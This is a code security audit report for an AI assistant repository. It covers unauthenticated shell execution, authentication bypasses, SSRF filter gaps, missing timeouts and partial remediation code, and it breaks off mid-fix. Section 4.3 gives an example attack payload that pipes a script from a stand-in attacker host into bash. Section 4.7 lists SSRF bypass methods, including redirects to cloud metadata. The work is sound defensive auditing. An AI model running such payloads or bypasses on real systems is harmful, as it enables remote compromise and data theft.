# AGENT 8 AUDIT REPORT: INTEGRATIONS & EXTERNAL CONNECTIVITY

**Target Document**: `audit/06-agent-reports/integrations.md`  
**Auditor**: AGENT 8 — Integrations & External Connectivity Auditor  
**Audit Standard**: Evidence over assumptions; direct AST/code citations.

---

## Executive Summary

A comprehensive, line-by-line audit of the external integrations, machine control gateways, telemetry ingestion pipelines, cloud AI APIs, and OS-level execution bridges in the JARVIS/Sofia repository revealed **critical remote code execution (RCE) vulnerabilities**, **catastrophic authentication bypasses**, **hallucinated model identifiers**, and **unhandled network failure modes**.

### Key Findings Overview
1. **Unauthenticated Remote Code Execution (RCE) via Live Tool API** (`src/app/api/live/tool/route.ts:5-27`):
   The `/api/live/tool` endpoint accepts arbitrary tool calls from any caller without any authentication checks. It routes directly to `executeTool()`, which allows arbitrary shell execution via `computer_run` (`execSync(args.command)`) and arbitrary filesystem read/write (`fs.readFileSync`, `fs.writeFileSync`).
2. **Global Auth Bypass When Environment Variables are Unset** (`src/lib/auth.ts:8-13`, `src/proxy.ts:40-43`):
   If `SOFIA_API_TOKEN` and `SOFIA_AUTH_TOKEN` are not set, authentication is globally disabled across all `/api/*` endpoints. Furthermore, `/api/cron/[job]` skips token verification if `CRON_SECRET` is unset (`src/app/api/cron/[job]/route.ts:22-35`), leaving cron tasks open to public triggering.
3. **Hermes Gateway Port & Protocol Mismatches**:
   - `scripts/hermes-relay.py:14` forwards to target `127.0.0.1:8643`.
   - `src/lib/tools.ts:803` defaults `laptopUrl` to `http://127.0.0.1:8642/v1`.
   - `src/app/chat/page.tsx:119` alerts users to check port `8642`.
   - `scripts/hermes-relay.py` provides an unauthenticated raw TCP proxy with unbounded thread spawning and client socket leaks on connection errors.
4. **Collector Architecture Schism**:
   - Two competing, divergent scripts exist: `scripts/agent-pc.py` (polls ActivityWatch on port 5600, sends `X-Device-Token`, categorizes windows, batches events) and `agent-pc/agent.py` (executes un-sandboxed `xdotool`/`xprop` without timeout, sends NO auth headers, hardcodes fallback mock data, omits categories).
   - `/api/ingest/heartbeat` does not validate tokens and stores plaintext token headers directly into the database column `devices.token_hash`.
5. **AI Service Failures & Hallucinated Model Identifiers**:
   - `src/lib/brain.ts:643` requests `v1beta/models/gemini-3.5-flash-lite:generateContent`. `gemini-3.5-flash-lite` does not exist in the Google Gemini API, returning HTTP 404.
   - `src/lib/live/config.ts:26` and `src/lib/live/session.ts:92` default to `gemini-3.8-live`, which is not a valid Gemini Live WebSocket model.
   - External fetch calls to ElevenLabs (`src/lib/tts.ts:149`), GitHub (`src/lib/github.ts:30`), and Telegram (`src/lib/tools.ts:594`, `src/app/api/cron/[job]/route.ts:61`) lack request abort timeouts, risking indefinite process hangs.
6. **SSRF Validator Bypass** (`src/app/api/browse/route.ts:3-39`):
   The SSRF filter only inspects IPv4 literal notation, allowing intranet/loopback requests via DNS rebinding, internal hostnames, and HTTP 30x redirects.

---

## 1. Integration Ecosystem Map

```mermaid
flowchart TD
    subgraph External_Cloud["External Cloud & AI APIs"]
        LiteLLM["LiteLLM AI Proxy<br/>ai-proxy.zenova.services/v1<br/>(DeepSeek-v4.1-flash)"]
        GeminiREST["Google Gemini REST<br/>generativelanguage.googleapis.com<br/>(gemini-3.5-flash-lite [INVALID])"]
        GeminiLive["Google Gemini Live Bidi WSS<br/>wss://generativelanguage.googleapis.com<br/>(gemini-3.8-live [INVALID])"]
        GoogleAuth["Google Auth Token Minting<br/>v1beta/auth_tokens"]
        ElevenLabs["ElevenLabs TTS API<br/>api.elevenlabs.io/v1/text-to-speech<br/>(eleven_turbo_v2_5)"]
        EdgeTTS["Microsoft Edge TTS WSS<br/>msedge-tts (No Key, Unofficial)"]
        GitHubAPI["GitHub Events API<br/>api.github.com/users/:username/events"]
        TelegramAPI["Telegram Bot API<br/>api.telegram.org/bot:token/sendMessage"]
    end

    subgraph Sofia_Core["Sofia Core Server (Next.js / Node.js :3000)"]
        ProxyAuth["src/proxy.ts & src/lib/auth.ts<br/>Token Guard & Matcher"]
        Brain["src/lib/brain.ts<br/>AI Reasoning & Tool Loop"]
        Tools["src/lib/tools.ts<br/>Unified Tool Execution"]
        TTS["src/lib/tts.ts & /api/tts<br/>Audio Synthesis & Cache"]
        Proactive["src/lib/proactive.ts & /api/cron<br/>Cron & Telegram Push"]
        IngestRoutes["/api/ingest/events & /api/ingest/heartbeat<br/>Telemetry Collector Endpoints"]
        LiveTokenRoute["/api/live/token & /api/live/tool<br/>Live Session Bridge"]
        BrowseRoute["/api/browse<br/>SSRF-vulnerable Web Fetcher"]
        SQLite[("SQLite DB: data/sofia.db<br/>(events, stats, devices, schedules)")]
    end

    subgraph Local_Host["Host Machine & Desktop OS"]
        X11["X11 Desktop Capture<br/>'DISPLAY=:0 import -window root'"]
        ShellExec["Host Shell Execution<br/>'execSync(command)'"]
        LocalFS["Local Filesystem<br/>'fs.readFileSync / writeFileSync'"]
    end

    subgraph Hermes_Gateway["Hermes Machine Control Gateway"]
        HermesRelay["scripts/hermes-relay.py<br/>TCP Proxy (10.0.1.1:8644 -> 127.0.0.1:8643)"]
        HermesDaemon["Hermes Agent Daemon<br/>(Port 8642 vs 8643 Mismatch)"]
    end

    subgraph Telemetry_Collectors["Telemetry Collectors"]
        AgentPy["agent-pc/agent.py<br/>Direct xdotool / xprop CLI<br/>(Unauthenticated, No Category)"]
        AgentScript["scripts/agent-pc.py<br/>ActivityWatch Integration (:5600)<br/>(Authenticated, Token Mismatch)"]
        ActivityWatch["ActivityWatch Daemon (:5600)"]
    end

    %% Connections
    Brain -->|POST /chat/completions| LiteLLM
    Brain -->|POST v1beta/generateContent| GeminiREST
    Brain -->|executeTool| Tools
    Tools -->|POST /chat/completions| HermesRelay
    Tools -->|POST /chat/completions| HermesDaemon
    HermesRelay -->|TCP Raw Socket| HermesDaemon
    Tools -->|execSync| ShellExec
    Tools -->|import| X11
    Tools -->|fs.*| LocalFS
    Tools -->|POST /sendMessage| TelegramAPI

    LiveTokenRoute -->|POST /auth_tokens| GoogleAuth
    LiveTokenRoute -->|executeTool| Tools
    Proactive -->|GET /events| GitHubAPI
    Proactive -->|POST /sendMessage| TelegramAPI
    TTS -->|POST /text-to-speech| ElevenLabs
    TTS -->|WSS| EdgeTTS

    AgentScript -->|Poll :5600| ActivityWatch
    AgentScript -->|POST /api/ingest/* (X-Device-Token)| IngestRoutes
    AgentPy -->|POST /api/ingest/* (No Auth)| IngestRoutes
    IngestRoutes -->|write| SQLite
    Tools -->|read/write| SQLite
    Proactive -->|read/write| SQLite
```

### Component Catalog & Communication Matrix

| Interface | Protocol & Transport | Target / Bind | Auth Mechanism | Direction | Timeout | Failure Mode |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **Hermes Tool Relay** (`scripts/hermes-relay.py`) | Raw TCP Socket | `10.0.1.1:8644` -> `127.0.0.1:8643` | None (Unauthenticated) | Bi-directional Relay | 60s select timeout | Connection drop, socket leak |
| **Hermes Gateway Dispatch** (`src/lib/tools.ts:802`) | HTTP POST (OpenAI format) | `127.0.0.1:8642` & `10.0.1.1:8644` | Bearer `LAPTOP_HERMES_KEY` | Egress from Node.js | 15s per endpoint (30s max) | Silent fallback, error swallowed |
| **Telemetry Events** (`/api/ingest/events`) | HTTP POST (JSON) | Node.js `:3000` | Header `X-Device-Token` (Optional) | Ingress | None | Returns 401 if token set; open if unset |
| **Telemetry Heartbeat** (`/api/ingest/heartbeat`) | HTTP POST (JSON) | Node.js `:3000` | None (Token stored plaintext) | Ingress | None | Unauthenticated write to DB |
| **LiteLLM Proxy** (`src/lib/brain.ts:548`) | HTTP POST (REST) | `ai-proxy.zenova.services/v1` | Bearer `LITELLM_API_KEY` | Egress | 45s AbortSignal | Falls through to Gemini |
| **Gemini REST API** (`src/lib/brain.ts:642`) | HTTP POST (REST) | `generativelanguage.googleapis.com` | URL Query param `?key=` | Egress | 25s AbortSignal | Falls through to local fact string |
| **Gemini Live Bidi WSS** (`src/lib/live/session.ts:241`) | WebSocket WSS | `generativelanguage.googleapis.com` | URL Query param `?access_token=` | Bi-directional (Client) | Heartbeat 1s, hard cap 40m | Falls back to speech recognition |
| **Gemini Live Tool Route** (`/api/live/tool`) | HTTP POST (JSON) | Node.js `:3000` | **NONE** (Critical RCE) | Ingress | None | Unauthenticated tool execution |
| **ElevenLabs TTS** (`src/lib/tts.ts:149`) | HTTP POST (REST) | `api.elevenlabs.io/v1/text-to-speech` | Header `xi-api-key` | Egress | **None (Hang Risk)** | Falls back to Edge TTS |
| **Edge TTS** (`src/lib/tts.ts:97`) | WSS (msedge-tts) | Microsoft Edge Speech Endpoint | None | Egress | Library default | Throws exception |
| **GitHub Events API** (`src/lib/github.ts:30`) | HTTP GET (REST) | `api.github.com/users/:username/events` | Bearer `GITHUB_TOKEN` (Optional) | Egress | **None (Hang Risk)** | Silent return `count: 0` |
| **Telegram Bot API** (`src/lib/tools.ts:594`, `/api/cron`) | HTTP POST (REST) | `api.telegram.org/bot:token/sendMessage`| Bot Token in Path | Egress | **None (Hang Risk)** | Silent error swallow, returns sent:true |
| **Desktop Screen Capture** (`src/lib/tools.ts:646`) | CLI `import` via `execSync` | Host X11 `:0` | Host OS permissions | OS Local | None (execSync default) | Falls back to Hermes delegation |
| **Desktop Command Exec** (`src/lib/tools.ts:671`) | CLI Shell via `execSync` | Host Subprocess | None (Arbitrary bash) | OS Local | `args.timeout_ms` (10s default) | Blocks event loop, returns exit code |
| **Web Browse Endpoint** (`/api/browse`) | HTTP GET via `fetch` | Target Web URL | None | Egress | 5s AbortController | SSRF bypassable |

---

## 2. Hermes Machine Control Gateway Audit

### 2.1 Hermes Socket Relay (`scripts/hermes-relay.py`)
- **Listening & Binding Insecurity** (`scripts/hermes-relay.py:13`):
  ```python
  LISTEN = ("0.0.0.0" if "--all" in sys.argv else "10.0.1.1", 8644)
  TARGET = ("127.0.0.1", 8643)
  ```
  The script binds to `10.0.1.1:8644` (or `0.0.0.0:8644` with `--all`). It provides no TLS, no IP filtering, and zero authentication. Any container or host on the Coolify network can connect to port `8644` and gain direct TCP access to `127.0.0.1:8643`.
- **Target Port Mismatch**:
  `scripts/hermes-relay.py:14` forwards to port `8643`. However:
  - `src/lib/tools.ts:803` defines default laptop target as `http://127.0.0.1:8642/v1`.
  - `.env.local:7` defines `HERMES_BRIDGE_URL=http://127.0.0.1:8642/v1`.
  - `src/app/chat/page.tsx:119` displays: *"Hermes gateway link timeout. Please check that hermes-gateway is active on port 8642."*
  If Hermes runs on `8643`, local calls to `8642` will fail with `ECONNREFUSED`. If Hermes runs on `8642`, the relay in `scripts/hermes-relay.py` forwards to the wrong port (`8643`).
- **Synchronous Connection in Accept Loop & Socket Descriptor Leak** (`scripts/hermes-relay.py:49-59`):
  ```python
  while True:
      try:
          c, _ = srv.accept()
          t = socket.create_connection(TARGET)
          threading.Thread(target=pipe, args=(c, t), daemon=True).start()
      except Exception as e:
          print(f"Relay error: {e}")
  ```
  `socket.create_connection(TARGET)` is executed synchronously on the main thread inside the accept loop. If the target service is slow, unresponsive, or connection is refused:
  1. The accept loop blocks completely.
  2. If `create_connection(TARGET)` raises an exception (e.g. `ConnectionRefusedError`), control jumps to `except Exception:`.
  3. **The accepted client socket `c` is never closed**, leaking file descriptors until process limits (`ulimit -n`) are exhausted.
- **Unbounded Thread Allocation (DoS Risk)**:
  Every incoming connection spawns a new thread without worker pooling or a semaphore. A burst of requests will lead to thread starvation.

### 2.2 Hermes Delegation in Sofia Core (`src/lib/tools.ts:802-845`)
- **Protocol Mismatch (Natural Language vs Structured Tool RPC)**:
  `delegateToHermes` issues an OpenAI-style chat completion:
  ```typescript
  body: JSON.stringify({
    model: 'hermes-agent',
    messages: [{ role: 'user', content: `Execute task/tool ${tool} with parameters: ${JSON.stringify(args)}` }],
    max_tokens: 400,
  })
  ```
  Instead of sending a structured JSON-RPC or tool invocation command, it transmits a freeform text prompt to the `/chat/completions` endpoint. If the model on Hermes produces conversational text or commentary along with the output, Sofia treats the entire raw conversational output as the tool execution result.
- **Silent Exception Swallowing & 30-Second Blocking Delay** (`src/lib/tools.ts:807-840`):
  ```typescript
  for (const baseUrl of [laptopUrl, bridgeUrl]) {
    try {
      const res = await fetch(`${baseUrl}/chat/completions`, { ... signal: AbortSignal.timeout(15000) });
      if (res.ok) { ... return ...; }
    } catch {}
  }
  ```
  Each endpoint has a 15-second timeout. If `laptopUrl` is offline or dead, Sofia blocks for 15,000ms before attempting `bridgeUrl` for another 15,000ms. All errors (DNS failures, connection refused, HTTP 500) are discarded in empty `catch {}` blocks, making troubleshooting impossible.

### 2.3 Local OS & Desktop Control Vulnerabilities (`src/lib/tools.ts`)
- **Arbitrary Shell Execution (RCE)** (`src/lib/tools.ts:668-696`):
  ```typescript
  case 'computer_run': {
    const timeout = Number(args.timeout_ms) || 10000;
    const stdout = execSync(args.command, { encoding: 'utf8', timeout }).trim();
    return { result: { command: args.command, stdout, exit_code: 0 }, ... };
  }
  ```
  `execSync` executes arbitrary commands directly in the shell with the permissions of the Node.js user. There is no command allowlist, no argument sanitization, and no confirmation prompt.
- **Synchronous Event Loop Freezing**:
  Because `execSync` is synchronous, running a 10-second command freezes the single-threaded Node.js event loop. All concurrent HTTP requests, audio streams, and background jobs are blocked until the command finishes.
- **Unsandboxed Filesystem Read & Write** (`src/lib/tools.ts:698-741`):
  `computer_file_read` and `computer_file_write` directly invoke `fs.readFileSync` and `fs.writeFileSync` on `args.path` without path normalization, restriction to the project workspace, or traversal prevention (`../`). An attacker or hallucinating model can read `/etc/shadow`, `~/.ssh/id_rsa`, or overwrite application code.
- **Fragile Screen Capture** (`src/lib/tools.ts:643-666`):
  `execSync('DISPLAY=:0 import -window root ${shotPath} 2>/dev/null')` hardcodes `DISPLAY=:0`. It fails silently on Wayland, on headless containers, or when the user is logged into display `:1`. Furthermore, reading the generated file into a Base64 data URI creates excessive memory overhead in the Node heap for large 4K displays.

### 2.4 Action Catalog Audit (`src/lib/actions/*`)
| Action File | Execution Mechanism | Implementation Status | Critical Defects |
| :--- | :--- | :--- | :--- |
| `backup-sofia-db.ts` | `fs.copyFileSync` | **DANGEROUS** | Copies active SQLite DB file while open without `.backup` or `VACUUM INTO`, risking corrupt backups during writes. |
| `git-status.ts` | `execSync` | Functional | Synchronous execution with **no timeout** (`execSync('git rev-parse...')`). Hung Git lock will hang server. |
| `restart-sofia.ts` | Static string return | **STUB / MOCK** | Returns static string *"Sofia services signaled..."*. Restarts nothing. |
| `sync-obsidian-vault.ts` | Static string return | **STUB / MOCK** | Returns static string *"142 notes in sync with local storage"*. Syncs nothing. |
| `tail-wazuh-alerts.ts` | Hardcoded array | **STUB / MOCK** | Returns simulated static security alerts (Rule 5501, 5710, 1002) with current timestamps. |
| `system-status.ts` | Node.js `os` module | Functional | Computes memory, load averages, uptime, and CPU count accurately. |

---

## 3. Telemetry Ingest & Background Collectors

### 3.1 Collector Architecture Divergence
The repository contains two separate collector implementations that have completely diverged:

```
                  ┌─────────────────────────────────────────────────────────────┐
                  │                 TELEMETRY COLLECTOR SCHISM                  │
                  └─────────────────────────────────────────────────────────────┘
                                  /                             \
                                 /                               \
       scripts/agent-pc.py                                   agent-pc/agent.py
       ───────────────────                                   ─────────────────
       • Source: ActivityWatch API (:5600)                   • Source: Linux CLI (xdotool, xprop)
       • Auth: Sends 'X-Device-Token'                        • Auth: NO AUTH HEADERS SENT
       • Heartbeat: 30s interval with 'status' (afk/active)   • Heartbeat: 60s interval, status missing
       • Events: Batches up to 50 events every 60s           • Events: 1 event every 60s
       • Deduplication: Deterministic 'aw-{id}'              • Deduplication: None (id missing)
       • Categorization: Work/Leisure/Neutral heuristics     • Categorization: None (category omitted)
       • Error handling: Backs off on failure                • Error handling: Hardcoded fallback mock
```

1. **`scripts/agent-pc.py`** (ActivityWatch-based):
   - Integrates with ActivityWatch via `http://localhost:5600`.
   - Sends `X-Device-Token` using env var `SOFIA_DEVICE_TOKEN` (defaulting to `"sofia-device-primary"`).
   - Inspects `afk` bucket to report accurate AFK status.
   - Categorizes window titles (`code`, `terminal` -> `work`; `youtube`, `reddit` -> `leisure`).
   - Assigns idempotent IDs: `evt_id = f"aw-{evt.get('id', '')}"`.
2. **`agent-pc/agent.py`** (CLI xdotool/xprop-based):
   - Invokes `subprocess.check_output(["xdotool", ...])` and `xprop` with **no timeouts**.
   - If commands fail (e.g. Wayland or headless), falls back to a hardcoded string (`"Code", "antigravity/sofia - VS Code"`), corrupting analytics with false activity.
   - **Does not send any authentication token**, causing immediate 401 rejection if the server enforces tokens.
   - Heartbeat payload omits `status` (`{"device": "pc-main"}`).
   - Event payload omits `id` and `category`, resulting in redundant DB row creation every 60 seconds.

### 3.2 Ingest Route Audits
- **Events Ingestion Route** (`src/app/api/ingest/events/route.ts:5-27`):
  - **Token Name Mismatch**: The server checks `process.env.DEVICE_TOKEN`:
    ```typescript
    const requiredToken = process.env.DEVICE_TOKEN;
    if (requiredToken) {
      const token = req.headers.get('x-device-token');
      if (token !== requiredToken) {
        return NextResponse.json({ error: 'unauthorized_device_token' }, { status: 401 });
      }
    }
    ```
    However, `scripts/agent-pc.py:26` defaults to `SOFIA_DEVICE_TOKEN`. If `DEVICE_TOKEN` is configured with one value and the collector uses `SOFIA_DEVICE_TOKEN`, authentication fails.
  - **Fail-Open Behavior**: If `DEVICE_TOKEN` is unset in `.env`, the authentication check is skipped entirely, allowing unauthenticated batch event ingestion.
  - **Redundant Day Stats Recalculation**:
    `ingestEvents(db, events)` (`src/lib/db.ts:427-429`) iterates over all dates present in the batch and calls `rebuildDayStats(db, d)`. Then `src/app/api/ingest/events/route.ts:21` unconditionally calls `rebuildDayStats(db, today)` again, performing duplicate SQLite aggregation queries on every batch.
- **Heartbeat Ingestion Route** (`src/app/api/ingest/heartbeat/route.ts:4-28`):
  - **Zero Authentication Enforcement**: The route reads `req.headers.get('x-device-token')` but never validates it against any secret.
  - **Plaintext Secret Leak into Database**:
    ```typescript
    db.prepare(`
      INSERT INTO devices (id, name, token_hash, last_seen, kind)
      VALUES (?, ?, ?, ?, 'pc')
      ON CONFLICT(id) DO UPDATE SET last_seen = ?, kind = 'pc'
    `).run(deviceId, deviceId, tokenHeader || 'unauthenticated', nowIso, nowIso);
    ```
    The column is named `token_hash`, but the server writes the raw plaintext `tokenHeader`. Any device token sent over HTTP is stored in plaintext in the database.

---

## 4. External AI & Cloud Services Audit

### 4.1 LiteLLM Proxy Integration (`src/lib/brain.ts:534-620`)
- **Configuration & Endpoint**:
  ```typescript
  const baseUrl = process.env.LITELLM_BASE_URL || settings.hermes?.base_url || 'https://ai-proxy.zenova.services/v1';
  const apiKey = (process.env.LITELLM_API_KEY || '').trim();
  const model = process.env.LITELLM_MODEL || settings.hermes?.model || 'deepseek-v4.1-flash';
  ```
- **Timeout & Retry Policy**:
  - Request uses `AbortSignal.timeout(45000)` (45 seconds).
  - Maximum tool recursion loop: 2 iterations (`while (loopCount < 2)`).
  - Error recovery: If `!res.ok` or a network exception occurs, it logs `console.warn` and breaks immediately, falling through to the Gemini provider.
- **Status in Active Environment**:
  In `.env.local:1`, `LITELLM_API_KEY=` is empty, so LiteLLM is bypassed in local development.

### 4.2 Google Gemini REST API (`src/lib/brain.ts:624-720`)
- **CRITICAL DEFECT — Hallucinated Model Name** (`src/lib/brain.ts:643`):
  ```typescript
  const geminiRes = await fetch(
    `https://generativelanguage.googleapis.com/v1beta/models/gemini-3.5-flash-lite:generateContent?key=${geminiKey}`,
    ...
  );
  ```
  `gemini-3.5-flash-lite` **does not exist** in the Google Gemini API. Google's actual model identifiers are `gemini-1.5-flash`, `gemini-1.5-flash-8b`, `gemini-2.0-flash`, `gemini-2.5-flash`. Calling this URL results in an immediate `HTTP 404 Not Found` response from Google:
  ```json
  { "error": { "code": 404, "message": "models/gemini-3.5-flash-lite is not found for API version v1beta", "status": "NOT_FOUND" } }
  ```
  Because this call fails, the tool calling loop breaks and Sofia falls back to the deterministic fact-based template response (`dynamicSay`).

### 4.3 Google Gemini Live WebSocket & Auth Token Minting
- **Token Minting Route** (`src/app/api/live/token/route.ts:25-33`):
  Calls `https://generativelanguage.googleapis.com/v1beta/auth_tokens` using `x-goog-api-key: apiKey` with `AbortSignal.timeout(15_000)`. Correctly mints single-use tokens valid for 30 minutes.
- **CRITICAL DEFECT — Hallucinated Live Model Name** (`src/lib/live/config.ts:26`, `src/lib/live/session.ts:92`):
  ```typescript
  model: process.env.SOFIA_LIVE_MODEL ?? 'gemini-3.8-live'
  ```
  `gemini-3.8-live` **does not exist** in Google AI Studio or Vertex AI. Attempting to initialize the Bidi WebSocket session with `models/gemini-3.8-live` causes the WebSocket connection to terminate with a handshake or setup failure.
- **CRITICAL VULNERABILITY — Unauthenticated Live Tool Dispatch** (`src/app/api/live/tool/route.ts:5-27`):
  When the Gemini Live WebSocket client receives a tool call, `src/lib/live/session.ts:380` sends a POST request to `/api/live/tool`.
  ```typescript
  export async function POST(req: NextRequest) {
    const body = await req.json().catch(() => ({}));
    const { name, args } = body;
    ...
    const execResult = await executeTool(db, name, args || {}, settings);
    return NextResponse.json(execResult);
  }
  ```
  **`/api/live/tool` contains NO authentication checks whatsoever.** Any attacker or unauthenticated client on the network can POST `{ "name": "computer_run", "args": { "command": "curl evil.com/pwn | bash" } }` and achieve instant, unauthenticated remote code execution on the host machine.

### 4.4 Speech Synthesis Integrations (`src/lib/tts.ts`, `src/app/api/tts/route.ts`)
- **ElevenLabs API** (`src/lib/tts.ts:119-181`):
  - Endpoint: `https://api.elevenlabs.io/v1/text-to-speech/${voiceId}` with model `eleven_turbo_v2_5`.
  - Cap Enforcement: Monthly budget limit enforced against SQLite `tts_usage` (`ELEVENLABS_MONTHLY_CAP = 10000`).
  - **MISSING TIMEOUT**: The `fetch()` call has no `AbortSignal.timeout()`. If the ElevenLabs API or network connection hangs, the request hangs indefinitely.
  - Fallback: Correctly catches errors and falls back to Edge TTS in `/api/tts/route.ts:40-48`.
- **Edge TTS** (`src/lib/tts.ts:78-112`):
  - Uses `msedge-tts` to stream audio over an undocumented WebSocket endpoint to Microsoft servers.
  - No authentication required.
  - **High fragility risk**: Any change to Microsoft's Edge browser headers, WebSocket protocols, or IP blocklists will instantly break synthesis without recourse.
- **Disk IO Bottlenecks**:
  Both synthesis functions use synchronous `fs.writeFileSync`, `fs.readdirSync`, `fs.statSync`, and `fs.unlinkSync` (`pruneAudioCache()`), blocking the event loop on audio cache writes.

### 4.5 GitHub Activity Integration (`src/lib/github.ts`)
- **Endpoint & Auth**: `https://api.github.com/users/:username/events?per_page=30` with optional `Bearer ${token}`.
- **MISSING TIMEOUT**: `fetch()` has no `AbortSignal.timeout()`.
- **Rate Limit Trap**:
  Without `GITHUB_TOKEN`, GitHub enforces a strict 60 requests/hour limit per IP. When exceeded, GitHub returns HTTP 403. The code checks `if (!res.ok) return { count: 0, status: 'github_api_error_403' }`, which silently fails to ingest commits.
- **Incomplete Event Coverage**:
  Only parses `PushEvent` and `PullRequestReviewEvent`. Discards Pull Request opens/merges, Issue creations, and Releases.
- **Date Boundary Defect**:
  `rebuildDayStats(db, today)` is only called for `today`. If a push includes commits authored or timestamped yesterday, yesterday's statistics are not rebuilt.

### 4.6 Telegram Bot Push (`src/lib/tools.ts:594`, `src/app/api/cron/[job]/route.ts:61`)
- **Endpoint**: `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`.
- **MISSING TIMEOUT**: Neither call uses an `AbortSignal`.
- **Silent Status Swallowing**:
  Neither call checks `res.ok`. If Telegram returns HTTP 400 (e.g. invalid `chat_id`), HTTP 401 (invalid bot token), or HTTP 429 (rate limited), the code ignores it and reports `{ sent: true }`.
- **Proactive Cron Channel Disconnect**:
  In `src/lib/proactive.ts:189`, the channel in `proactive_log` is hardcoded to `'screen'`. The internal proactive engine never sends Telegram messages directly; Telegram messages are only dispatched if an external runner hits `/api/cron/[job]` over HTTP.

### 4.7 Web Scraping & SSRF Filter (`src/app/api/browse/route.ts`)
- **SSRF Filter Vulnerability** (`src/app/api/browse/route.ts:3-39`):
  The filter blocks IPv4 dotted-quads (`127.*`, `10.*`, `192.168.*`, `172.16-31.*`, `169.254.*`) and literal hostnames `'localhost'`, `'::1'`.
  However, it fails against:
  1. **DNS Rebinding**: A domain like `a.spoofed-dns.com` pointing to `127.0.0.1` passes `isSsrfSafeUrl()`.
  2. **Intranet Hostnames**: Single-word hostnames like `http://vault/`, `http://kubernetes.default.svc/`, or `http://router.local/` pass because they do not match the 4-octet regex.
  3. **HTTP 30x Redirects**: `fetch(rawUrl)` does not specify `redirect: 'manual'`. If a public URL redirects to `http://127.0.0.1:8643/` or AWS metadata `http://169.254.169.254/`, `fetch` follows the redirect to loopback, bypassing `isSsrfSafeUrl` entirely!
  4. **Missing Authentication**: `/api/browse` has no auth guard, allowing Sofia to be used as an open web proxy.

---

## 5. Failure Handling, Connection Pooling & Resilience Gaps

### 5.1 Timeout & Connection Pooling Matrix
| Integration Target | Code Location | Timeout Defined? | AbortSignal Used? | Connection Pooling / Agent |
| :--- | :--- | :--- | :--- | :--- |
| **LiteLLM Proxy** | `src/lib/brain.ts:562` | **Yes (45s)** | Yes | Node default global `fetch` |
| **Gemini REST** | `src/lib/brain.ts:656` | **Yes (25s)** | Yes | Node default global `fetch` |
| **Gemini Auth Tokens** | `src/app/api/live/token/route.ts:32` | **Yes (15s)** | Yes | Node default global `fetch` |
| **Hermes Gateway** | `src/lib/tools.ts:820` | **Yes (15s)** | Yes | Node default global `fetch` |
| **ElevenLabs TTS** | `src/lib/tts.ts:149` | **NO (None)** | **NO** | Node default global `fetch` |
| **GitHub API** | `src/lib/github.ts:30` | **NO (None)** | **NO** | Node default global `fetch` |
| **Telegram API (Tools)** | `src/lib/tools.ts:594` | **NO (None)** | **NO** | Node default global `fetch` |
| **Telegram API (Cron)** | `src/app/api/cron/[job]/route.ts:61` | **NO (None)** | **NO** | Node default global `fetch` |
| **Web Browse Route** | `src/app/api/browse/route.ts:58` | **Yes (5s)** | Yes | Node default global `fetch` |
| **ActivityWatch Poll** | `scripts/agent-pc.py:58` | **Yes (4s)** | urllib timeout | Python urllib (No pool) |
| **Ingest Heartbeat (Python)** | `scripts/agent-pc.py:49` | **Yes (5s)** | urllib timeout | Python urllib (No pool) |
| **Window CLI Subprocesses** | `agent-pc/agent.py:21,33` | **NO (None)** | **NO** | Python subprocess |
| **Git Status Exec** | `src/lib/actions/git-status.ts:5` | **NO (None)** | **NO** | Node child_process |

### 5.2 Global Authentication Architecture Vulnerabilities
1. **Unconditional Bypass on Unset Secrets** (`src/lib/auth.ts:8-13`):
   ```typescript
   export function verifyApiAuth(req: NextRequest): { authorized: boolean; response?: NextResponse } {
     const expectedToken = process.env.SOFIA_API_TOKEN || process.env.SOFIA_AUTH_TOKEN;
     // If no token is set in the environment, allow access (local dev mode)
     if (!expectedToken) {
       return { authorized: true };
     }
   ```
   If a production deployment starts up without `SOFIA_API_TOKEN` populated in the environment, **all authentication is completely disabled across the entire system**.
2. **Cron Route Unauthenticated When Secret Unset** (`src/app/api/cron/[job]/route.ts:22-35`):
   ```typescript
   const expectedSecret = process.env.CRON_SECRET || process.env.SOFIA_AUTH_TOKEN || process.env.SOFIA_API_TOKEN;
   if (expectedSecret) {
     // verifies headers...
   }
   // If expectedSecret is undefined, execution proceeds without returning 401!
   ```
   If no secret is set, any external caller can trigger cron routines and force proactivity updates.
3. **Insecure Cookie Storage (`httpOnly: false`)** (`src/app/api/auth/route.ts:18,30`):
   The authentication token cookie `sofia_token` is set with `httpOnly: false`. Any Cross-Site Scripting (XSS) vulnerability in the dashboard allows complete theft of the master token via `document.cookie`.
4. **Echoing Master Secret in Auth Response** (`src/app/api/auth/route.ts:28`):
   When a user authenticates, the server responds with:
   ```typescript
   return NextResponse.json({ ok: true, token: expectedToken });
   ```
   Returning the secret token in the JSON body is an anti-pattern that exposes server credentials to client-side loggers, browser extensions, and network inspection proxies.
5. **Route Wrapper `withAuth` is Dead Code** (`src/lib/auth.ts:73-83`):
   The higher-order route wrapper `withAuth()` is defined but never imported or applied in any route handler in `src/app/api/`. Individual routes rely solely on `src/proxy.ts` middleware matching.

---

## 6. Remediation Plan for Robust External Connectivity

### Phase 1: Immediate Security Hotfixes (Priority P0)

#### 1. Close Unauthenticated RCE on `/api/live/tool`
Secure `src/app/api/live/tool/route.ts` with mandatory authentication:
```typescript
import { NextRequest, NextResponse } from 'next/server';
import { getDatabase, getSettings } from '@/lib/db';
import { executeTool } from '@/lib/tools';
import { verifyApiAuth } from '@/lib/auth';

export async function POST(req: NextRequest) {
  const auth = verifyApiAuth(req);
  if (!auth.authorized) {
    return auth.response!;
  }
  // Proceed with execution...
}
```

#### 2. Restrict and Sandbox `computer_run` and `computer_file_*`
In `src/lib/tools.ts`, remove unrestricted `execSync` and apply command whitelisting and directory sandboxing:
```typescript
const ALLOWED_COMMANDS = new Set(['git status --short', 'uptime', 'date', 'df -h']);
const WORKSPACE_DIR = process.cwd();

// computer_run: reject arbitrary shell execution
if (!ALLOWED_COMMANDS.has(args.command)) {
  return { result: { error: 'Command not in security allowlist' }, mood: 'concerned' };
}

// computer_file_read / write: prevent directory traversal
const resolvedPath = path.resolve(WORKSPACE_DIR, args.path);
if (!resolvedPath.startsWith(WORKSPACE_DIR)) {
  return { result: { error: 'Path traversal outside workspace denied' }, mood: 'concerned' };
}
```

#### 3. Enforce Strict Authentication in Production
Modify `src/lib/auth.ts` to fail-closed in production:
```typescript
export function verifyApiAuth(req: NextRequest) {
  const expectedToken = process.env.SOFIA_API_TOKEN || process.env.SOFIA_AUTH_TOKEN;
  if (!expectedToken) {
    if (process.env.NODE_ENV === 'production') {
